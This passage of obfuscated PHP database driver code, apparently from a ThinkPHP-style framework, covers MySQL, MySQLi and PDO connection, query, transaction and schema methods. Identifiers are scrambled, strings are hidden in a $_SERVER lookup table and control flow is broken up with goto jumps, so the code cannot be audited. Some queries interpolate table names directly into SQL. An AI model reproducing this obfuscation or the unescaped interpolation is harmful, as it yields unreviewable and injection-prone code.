$côß¼â¡å; } public function getTables($e÷µåáÕ¦÷ = '') { $c¸¡…Šù¥Ì =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!empty($e÷µåáÕ¦÷)) { $E£’ƒª”È¯ = $c¸¡…Šù¥Ì[820] . $e÷µåáÕ¦÷ . $c¸¡…Šù¥Ì[821]; } else { $E£’ƒª”È¯ = $c¸¡…Šù¥Ì[822]; } $b­Õœí‚¿ß = $this->query($E£’ƒª”È¯); $bØ›”¥ãÍÈ = array(); foreach ($b­Õœí‚¿ß as $Dï±ÍòÖˆ¥ => $A–»¼ÚÁÊâ) { $bØ›”¥ãÍÈ[$Dï±ÍòÖˆ¥] = current($A–»¼ÚÁÊâ); } return $bØ›”¥ãÍÈ; } public function replace($CÊƒ‚—¯, $eÄÓ’êÍ¹Õ = array()) { $e³‰×ª…¬ =& $_SERVER[í¤âËÚ£¶íÊ¢]; foreach ($CÊƒ‚—¯ as $fù«â„‹Œ => $D­îŠÍÀ˜) { $d‘ÁöôŞìé = $this->parseValue($D­îŠÍÀ˜); if (is_scalar($d‘ÁöôŞìé)) { $fùœŠöµ¶[] = $d‘ÁöôŞìé; $C£º—°¿´‚[] = $this->parseKey($fù«â„‹Œ); } } $DØ©åË¦’’ = $e³‰×ª…¬[823] . $this->parseTable($eÄÓ’êÍ¹Õ[$e³‰×ª…¬[284]]) . $e³‰×ª…¬[824] . implode($e³‰×ª…¬[47], $C£º—°¿´‚) . $e³‰×ª…¬[825] . implode($e³‰×ª…¬[47], $fùœŠöµ¶) . $e³‰×ª…¬[826]; return $this->execute($DØ©åË¦’’); } public function insertAll($e»¬×Ï¨³, $Døêš—ê = array(), $c¨Ò´óµØ˜ = false) { goto fª®Á›«ì; DÊ»”ìƒ•: $BœğèêªÀ = ($c¨Ò´óµØ˜ ? $cÖÖôçƒ“[828] : $cÖÖôçƒ“[829]) . $cÖÖôçƒ“[830] . $this->parseTable($Døêš—ê[$cÖÖôçƒ“[284]]) . $cÖÖôçƒ“[824] . implode($cÖÖôçƒ“[47], $Aí„»„Â…Ã) . $cÖÖôçƒ“[831] . implode($cÖÖôçƒ“[47], $eÀà¦àÃ¬è); return $this->execute($BœğèêªÀ); goto FìÊÍâÑÈÎ; fª®Á›«ì: $cÖÖôçƒ“ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!is_array($e»¬×Ï¨³[0])) { return !1; } $Aí„»„Â…Ã = array_keys($e»¬×Ï¨³[0]); goto BõÁÅğïˆ…; BõÁÅğïˆ…: $eÀà¦àÃ¬è = array(); foreach ($e»¬×Ï¨³ as $D‡àº†¬°Ì) { $d¼Ä‹–™×Á = array(); foreach ($D‡àº†¬°Ì as $E¡ìÎ…‰ø¢ => $E¥«ø‘¾‚´) { $E¥«ø‘¾‚´ = $this->parseValue($E¥«ø‘¾‚´); if (is_scalar($E¥«ø‘¾‚´)) { $d¼Ä‹–™×Á[] = $E¥«ø‘¾‚´; } } $eÀà¦àÃ¬è[] = $cÖÖôçƒ“[265] . implode($cÖÖôçƒ“[47], $d¼Ä‹–™×Á) . $cÖÖôçƒ“[826]; } array_walk($Aí„»„Â…Ã, array($this, $cÖÖôçƒ“[827])); goto DÊ»”ìƒ•; FìÊÍâÑÈÎ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $e–¼»ªÑÎ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->error = mysql_errno() . $e–¼»ªÑÎ[4] . mysql_error($this->_linkID); if ($e–¼»ªÑÎ[33] != $this->queryStr) { $this->error .= LNG($e–¼»ªÑÎ[45]) . $this->queryStr; } think_trace($this->error, $e–¼»ªÑÎ[33], $e–¼»ªÑÎ[46]); return $this->error; } public function escapeString($bŞÜ‹¨¿¿—) { if ($this->_linkID) { return mysql_real_escape_string($bŞÜ‹¨¿¿—, $this->_linkID); } else { return mysql_escape_string($bŞÜ‹¨¿¿—); } } public function parseKey(&$c•ëÖŸ„‡, $CìÓÙóíÛ = true) { $e™—‹¾® =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($CìÓÙóíÛ) { $c•ëÖŸ„‡ = $this->parseKeyCheck($c•ëÖŸ„‡); } if ($c•ëÖŸ„‡ != $e™—‹¾®[191] && !preg_match($e™—‹¾®[832], $c•ëÖŸ„‡)) { $c•ëÖŸ„‡ = $e™—‹¾®[389] . trim($c•ëÖŸ„‡, $e™—‹¾®[389]) . $e™—‹¾®[389]; } return $c•ëÖŸ„‡; } } class DbMysqli extends Db { public function __construct($f¨¹‡¨Í›· = '') { $EÏ´•¨çî™ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!extension_loaded($EÏ´•¨çî™[733])) { think_exception(think_lang($EÏ´•¨çî™[10]) . $EÏ´•¨çî™[833]); } if (!empty($f¨¹‡¨Í›·)) { $this->config = $f¨¹‡¨Í›·; if (empty($this->config[$EÏ´•¨çî™[13]])) { $this->config[$EÏ´•¨çî™[13]] = $EÏ´•¨çî™[33]; } } } public function connect($bÆ¨ƒ£½óœ = '', $cˆÅÇ¶‰¥Ê = 0) { $D…·æò•… =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!isset($this->linkID[$cˆÅÇ¶‰¥Ê])) { goto CÊÒ­òİ˜æ; A×ÕÊª©•ƒ: $this->connected = !0; if (1 != think_config($D…·æò•…[18])) { unset($this->config); } goto eõâ•øÇŸ¡; F¡„¶òÑéÄ: $fÖÉ½™÷¼Æ = $this->linkID[$cˆÅÇ¶‰¥Ê]->server_version; $this->linkID[$cˆÅÇ¶‰¥Ê]->query($D…·æò•…[811] . think_config($D…·æò•…[812]) . $D…·æò•…[55]); if ($fÖÉ½™÷¼Æ > $D…·æò•…[813]) { $this->linkID[$cˆÅÇ¶‰¥Ê]->query($D…·æò•…[814]); } goto A×ÕÊª©•ƒ; CÊÒ­òİ˜æ: if (empty($bÆ¨ƒ£½óœ)) { $bÆ¨ƒ£½óœ = $this->config; } $this->linkID[$cˆÅÇ¶‰¥Ê] = new mysqli($bÆ¨ƒ£½óœ[$D…·æò•…[807]], $bÆ¨ƒ£½óœ[$D…·æò•…[809]], $bÆ¨ƒ£½óœ[$D…·æò•…[810]], $bÆ¨ƒ£½óœ[$D…·æò•…[17]], $bÆ¨ƒ£½óœ[$D…·æò•…[808]] ? intval($bÆ¨ƒ£½óœ[$D…·æò•…[808]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto F¡„¶òÑéÄ; eõâ•øÇŸ¡: } return $this->linkID[$cˆÅÇ¶‰¥Ê]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($a¯›õ¦ùÙˆ) { goto bÌæä‡ËŒÁ; cÈ¥šó†¾–: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto FˆåÁãÚµ‰; bÌæä‡ËŒÁ: $Bš¹”“¸Æ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto AÅİæ¸´ß‹; AïÏƒ›¾ÑÔ: think_status($Bš¹”“¸Æ[20]); $this->queryID = $this->_linkID->query($a¯›õ¦ùÙˆ); if ($this->_linkID->more_results()) { while (($d†–Ãô° = $this->_linkID->next_result()) != NULL) { $d†–Ãô°->free_result(); } } goto cÈ¥šó†¾–; AÅİæ¸´ß‹: $this->queryStr = $a¯›õ¦ùÙˆ; if ($this->queryID) { $this->free(); } think_action_status($Bš¹”“¸Æ[19], 1); goto AïÏƒ›¾ÑÔ; FˆåÁãÚµ‰: } public function execute($b­½Ç·Ë) { goto cå…è˜ïù«; f‚ Ğšº†: think_status($F‹ÑùÃæªÍ[20]); $F¬’ôªÃØé = $this->_linkID->query($b­½Ç·Ë); $this->debug(); goto aåÇÁ¬ƒØ; b°¡¿â£ò¼: $this->queryStr = $b­½Ç·Ë; if ($this->queryID) { $this->free(); } think_action_status($F‹ÑùÃæªÍ[21], 1); goto f‚ Ğšº†; aåÇÁ¬ƒØ: if (!1 === $F¬’ôªÃØé) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto AâÛ‰ë›±é; cå…è˜ïù«: $F‹ÑùÃæªÍ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b°¡¿â£ò¼; AâÛ‰ë›±é: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BÀóÏ¹‚¨ï = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$BÀóÏ¹‚¨ï) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Dâ …øÉÛ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Dâ …øÉÛ) { $this->error(); return !1; } } return !0; } private function getAll() { $C„ÌÌéè™ = array(); if ($this->numRows > 0) { for ($bŸ œÏæÉ = 0; $bŸ œÏæÉ < $this->numRows; $bŸ œÏæÉ++) { $C„ÌÌéè™[$bŸ œÏæÉ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $C„ÌÌéè™; } public function getFields($cŠ©Ù†ç) { $D¿ ÜÂ ÌÛ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bÉÉ³‰çĞ = $this->query($D¿ ÜÂ ÌÛ[818] . $this->parseKey($cŠ©Ù†ç)); $Cß”ÀãîÜ¿ = array(); if ($bÉÉ³‰çĞ) { foreach ($bÉÉ³‰çĞ as $E°áöŞ“İ => $fŞ§ÒÁ§ğÄ) { $Cß”ÀãîÜ¿[$fŞ§ÒÁ§ğÄ[$D¿ ÜÂ ÌÛ[27]]] = array($D¿ ÜÂ ÌÛ[28] => $fŞ§ÒÁ§ğÄ[$D¿ ÜÂ ÌÛ[27]], $D¿ ÜÂ ÌÛ[29] => $fŞ§ÒÁ§ğÄ[$D¿ ÜÂ ÌÛ[30]], $D¿ ÜÂ ÌÛ[31] => (bool) ($fŞ§ÒÁ§ğÄ[$D¿ ÜÂ ÌÛ[32]] === $D¿ ÜÂ ÌÛ[33]), $D¿ ÜÂ ÌÛ[34] => $fŞ§ÒÁ§ğÄ[$D¿ ÜÂ ÌÛ[35]], $D¿ ÜÂ ÌÛ[36] => strtolower($fŞ§ÒÁ§ğÄ[$D¿ ÜÂ ÌÛ[37]]) == $D¿ ÜÂ ÌÛ[38], $D¿ ÜÂ ÌÛ[39] => strtolower($fŞ§ÒÁ§ğÄ[$D¿ ÜÂ ÌÛ[40]]) == $D¿ ÜÂ ÌÛ[41]); } } return $Cß”ÀãîÜ¿; } public function getTables($F×®ä‡Í¦» = '') { $FÃÒèÑİªè =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CÌƒÒ­µÀ = !empty($F×®ä‡Í¦») ? $FÃÒèÑİªè[820] . $F×®ä‡Í¦» . $FÃÒèÑİªè[821] : $FÃÒèÑİªè[822]; $AÎ¥Š¬Şé­ = $this->query($CÌƒÒ­µÀ); $B¯òš˜­ŸÁ = array(); if ($AÎ¥Š¬Şé­) { foreach ($AÎ¥Š¬Şé­ as $DËº’Èõß‘ => $a˜´áƒòÀ) { $B¯òš˜­ŸÁ[$DËº’Èõß‘] = current($a˜´áƒòÀ); } } return $B¯òš˜­ŸÁ; } public function replace($cÈ°Û·¬‚, $BË¿ƒ¼±·Í = array()) { $A´ì«µ‹Õ =& $_SERVER[í¤âËÚ£¶íÊ¢]; foreach ($cÈ°Û·¬‚ as $aáÏÃ¹·£— => $bÆŞ‹­„áÎ) { $Aˆ×İİÅÆÉ = $this->parseValue($bÆŞ‹­„áÎ); if (is_scalar($Aˆ×İİÅÆÉ)) { $a„Ì½ÒÎ´˜[] = $Aˆ×İİÅÆÉ; $BíÚÛÔô†ò[] = $this->parseKey($aáÏÃ¹·£—); } } $fÚÀ³¸âÊ” = $A´ì«µ‹Õ[823] . $this->parseTable($BË¿ƒ¼±·Í[$A´ì«µ‹Õ[284]]) . $A´ì«µ‹Õ[824] . implode($A´ì«µ‹Õ[47], $BíÚÛÔô†ò) . $A´ì«µ‹Õ[825] . implode($A´ì«µ‹Õ[47], $a„Ì½ÒÎ´˜) . $A´ì«µ‹Õ[826]; return $this->execute($fÚÀ³¸âÊ”); } public function insertAll($cà¨Â‘ù—, $AÀÃÜ™‰ô¥ = array(), $Cšå£½¤ = false) { goto b£¸³½—ô; b£¸³½—ô: $CÕëé®Úš =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!is_array($cà¨Â‘ù—[0])) { return !1; } $f¯‡£Ã¯º’ = array_keys($cà¨Â‘ù—[0]); goto dÙäÅŒ¸Ï’; dÙäÅŒ¸Ï’: $E½‹Òï£å­ = array(); foreach ($cà¨Â‘ù— as $b“Ø•›¿ôÚ) { $cºÓÓ“õ  = array(); foreach ($b“Ø•›¿ôÚ as $bºµ£ë­œƒ => $CÑÁŞ±³£î) { $CÑÁŞ±³£î = $this->parseValue($CÑÁŞ±³£î); if (is_scalar($CÑÁŞ±³£î)) { $cºÓÓ“õ [] = $CÑÁŞ±³£î; } } $E½‹Òï£å­[] = $CÕëé®Úš[265] . implode($CÕëé®Úš[47], $cºÓÓ“õ ) . $CÕëé®Úš[826]; } array_walk($f¯‡£Ã¯º’, array($this, $CÕëé®Úš[827])); goto E•î­›İµğ; E•î­›İµğ: $eâ„ãßšğß = $Cšå£½¤ ? $CÕëé®Úš[828] : $CÕëé®Úš[829]; $C³µ ÛˆË = $eâ„ãßšğß . $CÕëé®Úš[830] . $this->parseTable($AÀÃÜ™‰ô¥[$CÕëé®Úš[284]]) . $CÕëé®Úš[824] . implode($CÕëé®Úš[47], $f¯‡£Ã¯º’) . $CÕëé®Úš[831] . implode($CÕëé®Úš[47], $E½‹Òï£å­); return $this->execute($C³µ ÛˆË); goto eĞ‰¢à¿ï; eĞ‰¢à¿ï: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $E¢ƒÀ¨“ŒÃ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->error = $this->_linkID->errno . $E¢ƒÀ¨“ŒÃ[4] . $this->_linkID->error; if ($E¢ƒÀ¨“ŒÃ[33] != $this->queryStr) { $this->error .= LNG($E¢ƒÀ¨“ŒÃ[45]) . $this->queryStr; } think_trace($this->error, $E¢ƒÀ¨“ŒÃ[33], $E¢ƒÀ¨“ŒÃ[46]); return $this->error; } public function escapeString($c²¯ä¼ÀØ¤) { if ($this->_linkID) { return $this->_linkID->real_escape_string($c²¯ä¼ÀØ¤); } else { return addslashes($c²¯ä¼ÀØ¤); } } public function parseKey(&$Câëå±îì¬, $c ªøñÅ‘´ = true) { $Eƒ¾ÄØ¸… =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($c ªøñÅ‘´) { $Câëå±îì¬ = $this->parseKeyCheck($Câëå±îì¬); } if ($Câëå±îì¬ != $Eƒ¾ÄØ¸…[191] && !preg_match($Eƒ¾ÄØ¸…[832], $Câëå±îì¬)) { $Câëå±îì¬ = $Eƒ¾ÄØ¸…[389] . trim($Câëå±îì¬, $Eƒ¾ÄØ¸…[389]) . $Eƒ¾ÄØ¸…[389]; } return $Câëå±îì¬; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($bç£ùõÈ™ = '') { $Bº‰Ëˆ·×¦ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!class_exists($Bº‰Ëˆ·×¦[834])) { think_exception(think_lang($Bº‰Ëˆ·×¦[10]) . $Bº‰Ëˆ·×¦[835]); } if (!empty($bç£ùõÈ™)) { $this->config = $bç£ùõÈ™; if (empty($this->config[$Bº‰Ëˆ·×¦[13]])) { $this->config[$Bº‰Ëˆ·×¦[13]] = array(); } } } public function connect($e‡°Šæ­• = '', $F³ÂÁ÷¾˜ = 0) { $eÔ¹äçÄ¼É =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!isset($this->linkID[$F³ÂÁ÷¾˜])) { goto C‘ËŸ°ô‰–; eÓß…ˆÜšÅ: try { $this->linkID[$F³ÂÁ÷¾˜] = new PDO($e‡°Šæ­•[$eÔ¹äçÄ¼É[836]], $e‡°Šæ­•[$eÔ¹äçÄ¼É[809]], $e‡°Šæ­•[$eÔ¹äçÄ¼É[810]], $e‡°Šæ­•[$eÔ¹äçÄ¼É[13]]); } catch (PDOException $f’ïŒ¥ãˆ) { think_exception($f’ïŒ¥ãˆ->getMessage()); } $this->dbType = $this->_getDsnType($e‡°Šæ­•[$eÔ¹äçÄ¼É[836]]); if (in_array($this->dbType, array($eÔ¹äçÄ¼É[837], $eÔ¹äçÄ¼É[838], $eÔ¹äçÄ¼É[839], $eÔ¹äçÄ¼É[840]))) { think_exception($eÔ¹äçÄ¼É[841] . $this->dbType . $eÔ¹äçÄ¼É[842] . $this->dbType . $eÔ¹äçÄ¼É[843]); } goto bÜ¹š•Ã•; bÜ¹š•Ã•: if (!$this->linkID[$F³ÂÁ÷¾˜]) { think_exception($eÔ¹äçÄ¼É[844]); } try { $this->linkID[$F³ÂÁ÷¾˜]->exec($eÔ¹äçÄ¼É[845] . think_config($eÔ¹äçÄ¼É[812])); } catch (Exception $f’ïŒ¥ãˆ) { } $this->connected = !0; goto dÌÄ°¥×ô”; C‘ËŸ°ô‰–: if (empty($e‡°Šæ­•)) { $e‡°Šæ­• = $this->config; } $B‘ˆ¾á± = !empty($e‡°Šæ­•[$eÔ¹äçÄ¼É[13]][$eÔ¹äçÄ¼É[14]]) ? $e‡°Šæ­•[$eÔ¹äçÄ¼É[13]][$eÔ¹äçÄ¼É[14]] : $this->pconnect; if ($B‘ˆ¾á±) { $e‡°Šæ­•[$eÔ¹äçÄ¼É[13]][PDO::ATTR_PERSISTENT] = !0; } goto eÓß…ˆÜšÅ; dÌÄ°¥×ô”: if (1 != think_config($eÔ¹äçÄ¼É[18])) { unset($this->config); } goto eÎ™„ö·İØ; eÎ™„ö·İØ: } return $this->linkID[$F³ÂÁ÷¾˜]; } public function free() { $this->PDOStatement = null; } public function query($a“µÑÃÅê, $CÕ¡‡‚÷Òê = array()) { goto fÚáçÚæ”æ; d›™á„Šß×: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $FÒ´çŠŠ“  = $this->PDOStatement->execute($CÕ¡‡‚÷Òê); $this->debug(); goto Fô±‡ƒ—ô; fÚáçÚæ”æ: $AèĞ™º” =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dñİŒÀÖã­; EÚ”¡¢á: think_action_status($AèĞ™º”[19], 1); think_status($AèĞ™º”[20]); $this->PDOStatement = $this->_linkID->prepare($a“µÑÃÅê); goto d›™á„Šß×; dñİŒÀÖã­: $this->queryStr = $a“µÑÃÅê; if (!empty($CÕ¡‡‚÷Òê)) { $this->queryStr .= $AèĞ™º”[846] . print_r($CÕ¡‡‚÷Òê, !0) . $AèĞ™º”[847]; } if (!empty($this->PDOStatement)) { $this->free(); } goto EÚ”¡¢á; Fô±‡ƒ—ô: if (!1 === $FÒ´çŠŠ“ ) { $this->error(); return !1; } else { return $this->getAll(); } goto c°æ÷ÛÇô–; c°æ÷ÛÇô–: } public function execute($ašáÀšÅº, $AŒƒ§åŸ©’ = array()) { goto FÑ‡‰†´; f¨¹İíÆÓÍ: $this->queryStr = $ašáÀšÅº; if (!empty($AŒƒ§åŸ©’)) { $this->queryStr .= $AÌ¦Ÿ±·µ[846] . print_r($AŒƒ§åŸ©’, !0) . $AÌ¦Ÿ±·µ[847]; } $F™…Ù´Û¥Ô = !1; goto bÑå·ˆ¯ÒŒ; FÑ‡‰†´: $AÌ¦Ÿ±·µ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f¨¹İíÆÓÍ; d˜…¿ÉŸ±¬: think_status($AÌ¦Ÿ±·µ[20]); $this->PDOStatement = $this->_linkID->prepare($ašáÀšÅº); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto D‰†œÆÏ‡È; bÑå·ˆ¯ÒŒ: if ($this->dbType == $AÌ¦Ÿ±·µ[840]) { if (preg_match($AÌ¦Ÿ±·µ[848], $this->queryStr, $B¹ÔçŠÕ•)) { $this->table = think_config($AÌ¦Ÿ±·µ[849]) . str_ireplace(think_config($AÌ¦Ÿ±·µ[850]), $AÌ¦Ÿ±·µ[360], $B¹ÔçŠÕ•[2]); $F™…Ù´Û¥Ô = (bool) $this->query($AÌ¦Ÿ±·µ[851] . strtoupper($this->table) . $AÌ¦Ÿ±·µ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($AÌ¦Ÿ±·µ[21], 1); goto d˜…¿ÉŸ±¬; D‰†œÆÏ‡È: $dëËÕÜËÒè = $this->PDOStatement->execute($AŒƒ§åŸ©’); $this->debug(); if (!1 === $dëËÕÜËÒè) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($F™…Ù´Û¥Ô || preg_match($AÌ¦Ÿ±·µ[852], $ašáÀšÅº)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto BË†ñ”†ÄÂ; BË†ñ”†ÄÂ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C™›¾ÓŸæ¾ = $this->_linkID->commit(); $this->transTimes = 0; if (!$C™›¾ÓŸæ¾) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dâçŞ­¦¬Ë = $this->_linkID->rollback(); $this->transTimes = 0; if (!$dâçŞ­¦¬Ë) { $this->error(); return !1; } } return !0; } private function getAll() { $eäöœ…Ê = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($eäöœ…Ê); return $eäöœ…Ê; } public function getFields($dÊ¨ÅÅêŠí) { goto bçœòº¸ù²; Dğ¼¹èòªÉ: $a­Šá¥ « = $this->query($AÔ‹†¿ÑĞ); $D‰ö»¯³Õ¹ = array(); if ($a­Šá¥ «) { foreach ($a­Šá¥ « as $f¹ò˜—Ù÷ƒ => $bÒùÇ–—šÊ) { $bÒùÇ–—šÊ = array_change_key_case($bÒùÇ–—šÊ); $bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[28]] = isset($bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[28]]) ? $bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[28]] : $eñ‘ÂÙµ·ğ[360]; $bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[29]] = isset($bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[29]]) ? $bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[29]] : $eñ‘ÂÙµ·ğ[360]; $fïîÎ°äÀ³ = isset($bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[278]]) ? $bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[278]] : $bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[28]]; $D‰ö»¯³Õ¹[$fïîÎ°äÀ³] = array($eñ‘ÂÙµ·ğ[28] => $fïîÎ°äÀ³, $eñ‘ÂÙµ·ğ[29] => $bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[29]], $eñ‘ÂÙµ·ğ[31] => (bool) (isset($bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[112]]) && $bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[112]] === $eñ‘ÂÙµ·ğ[33] || isset($bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[31]]) && $bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[31]] === $eñ‘ÂÙµ·ğ[33]), $eñ‘ÂÙµ·ğ[34] => isset($bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[34]]) ? $bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[34]] : (isset($bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[53]]) ? $bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[53]] : $eñ‘ÂÙµ·ğ[360]), $eñ‘ÂÙµ·ğ[36] => isset($bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[102]]) ? strtolower($bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[102]]) == $eñ‘ÂÙµ·ğ[38] : (isset($bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[54]]) ? $bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[54]] : !1), $eñ‘ÂÙµ·ğ[39] => isset($bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[869]]) ? strtolower($bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[869]]) == $eñ‘ÂÙµ·ğ[41] : (isset($bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[102]]) ? $bÒùÇ–—šÊ[$eñ‘ÂÙµ·ğ[102]] : !1)); } } goto aß¸ø’‡Ô; aß¸ø’‡Ô: return $D‰ö»¯³Õ¹; goto Bòƒ¾Š—î†; bçœòº¸ù²: $eñ‘ÂÙµ·ğ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->initConnect(!0); if (think_config($eñ‘ÂÙµ·ğ[853])) { $AÔ‹†¿ÑĞ = str_replace($eñ‘ÂÙµ·ğ[854], $dÊ¨ÅÅêŠí, think_config($eñ‘ÂÙµ·ğ[853])); } else { switch ($this->dbType) { case $eñ‘ÂÙµ·ğ[837]: case $eñ‘ÂÙµ·ğ[855]: $AÔ‹†¿ÑĞ = "\x53\105\x4c\105\103\124\40\40\x20\143\x6f\x6c\x75\x6d\x6e\x5f\156\x61\x6d\x65\x20\x61\x73\x20\47\x4e\x61\x6d\145\47\54\40\40\40\x64\141\x74\x61\137\x74\171\160\x65\40\x61\x73\40\x27\x54\x79\x70\145\x27\x2c\40\40\x20\x63\157\154\x75\x6d\x6e\137\144\145\x66\141\165\154\164\x20\x61\163\40\47\104\145\146\x61\x75\x6c\164\47\x2c\40\x20\40\151\x73\137\156\165\x6c\x6c\141\142\154\145\x20\x61\x73\40\x27\x4e\165\154\x6c\47\12\x9\11\x46\122\117\115\11\x69\x6e\146\157\162\155\141\164\151\x6f\156\x5f\x73\x63\x68\145\x6d\141\x2e\x74\x61\x62\154\145\163\40\101\123\40\164\xa\x9\11\112\x4f\x49\116\x9\151\x6e\x66\157\x72\x6d\141\164\151\x6f\x6e\137\x73\143\x68\145\x6d\x61\56\x63\x6f\x6c\165\155\x6e\x73\x20\101\123\x20\143\12\x9\11\117\116\x20\x20\164\x2e\164\x61\x62\154\x65\137\143\x61\164\x61\154\x6f\x67\40\x3d\40\143\x2e\x74\x61\x62\154\x65\x5f\143\x61\164\141\154\157\x67\xa\x9\x9\101\116\104\40\x74\56\164\x61\x62\x6c\145\137\x73\x63\150\145\x6d\x61\x20\x3d\x20\143\56\x74\141\142\x6c\x65\137\163\143\150\145\x6d\x61\xa\x9\x9\x41\x4e\104\40\x74\x2e\164\x61\x62\x6c\x65\x5f\x6e\141\x6d\x65\x20\x3d\x20\143\x2e\164\x61\x62\154\x65\137\156\141\x6d\145\12\11\11\x57\110\x45\x52\105\x20\40\x20\x74\56\164\x61\x62\x6c\145\x5f\156\141\x6d\145\40\x3d\40\47{$dÊ¨ÅÅêŠí}\x27"; break; case $eñ‘ÂÙµ·ğ[856]: $AÔ‹†¿ÑĞ = $eñ‘ÂÙµ·ğ[857] . $dÊ¨ÅÅêŠí . $eñ‘ÂÙµ·ğ[858]; break; case $eñ‘ÂÙµ·ğ[838]: case $eñ‘ÂÙµ·ğ[840]: $AÔ‹†¿ÑĞ = $eñ‘ÂÙµ·ğ[859] . $eñ‘ÂÙµ·ğ[860] . $eñ‘ÂÙµ·ğ[861] . strtoupper($dÊ¨ÅÅêŠí) . $eñ‘ÂÙµ·ğ[862] . strtoupper($dÊ¨ÅÅêŠí) . $eñ‘ÂÙµ·ğ[863]; break; case $eñ‘ÂÙµ·ğ[864]: $AÔ‹†¿ÑĞ = $eñ‘ÂÙµ·ğ[865] . $dÊ¨ÅÅêŠí . $eñ‘ÂÙµ·ğ[866]; break; case $eñ‘ÂÙµ·ğ[839]: break; case $eñ‘ÂÙµ·ğ[867]: default: $AÔ‹†¿ÑĞ = $eñ‘ÂÙµ·ğ[868] . ($this->dbType == $eñ‘ÂÙµ·ğ[867] ? "\140{$dÊ¨ÅÅêŠí}\140" : $dÊ¨ÅÅêŠí); } } goto Dğ¼¹èòªÉ; Bòƒ¾Š—î†: } public function getTables($C×Ò­‚ğ¸É = '') { $e„ãÃ¨ˆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (think_config($e„ãÃ¨ˆ[870])) { $Eå‰’°¢Ÿé = str_replace($e„ãÃ¨ˆ[871], $C×Ò­‚ğ¸É, think_config($e„ãÃ¨ˆ[870])); } else { switch ($this->dbType) { case $e„ãÃ¨ˆ[838]: case $e„ãÃ¨ˆ[840]: $Eå‰’°¢Ÿé = $e„ãÃ¨ˆ[872]; break; case $e„ãÃ¨ˆ[837]: case $e„ãÃ¨ˆ[855]: $Eå‰’°¢Ÿé = $e„ãÃ¨ˆ[873]; break; case $e„ãÃ¨ˆ[864]: $Eå‰’°¢Ÿé = $e„ãÃ¨ˆ[874]; break; case $e„ãÃ¨ˆ[839]: think_exception(think_lang($e„ãÃ¨ˆ[875]) . $e„ãÃ¨ˆ[876]); break; case $e„ãÃ¨ˆ[856]: 